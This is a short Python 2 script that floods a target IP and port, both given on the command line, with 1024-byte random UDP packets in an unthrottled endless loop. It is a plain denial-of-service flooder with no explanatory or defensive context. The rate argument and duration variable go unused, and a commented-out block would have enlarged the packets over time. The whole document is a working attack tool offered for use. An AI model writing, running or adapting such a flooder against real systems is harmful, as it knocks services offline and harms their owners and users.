from socket import *
import sys
import time
import random
def main():
	
	if len(sys.argv) != 4:
		print "Bad Arguments: <t_ip> <t_port> <t_pr>"
	else:
		targetIp = sys.argv[1]
	#	targetIp = ""
		targetPort = int(sys.argv[2])
		sock = socket(AF_INET,SOCK_DGRAM)
		packetSize = 512
		#data = "ab"*packetSize
		data = random._urandom(1024)
		incRate = float(sys.argv[3])/1000.0*60.0
		duration = time.time() + 30000
		lastPing = lastInc = time.time()
		while True:
			sock.sendto(data,(targetIp,targetPort))
			'''	
			if time.time() - lastInc > incRate and packetSize<60000.0:
				packetSize+=1
				data = "ab"*packetSize
				lastInc = time.time()
			'''
main()		
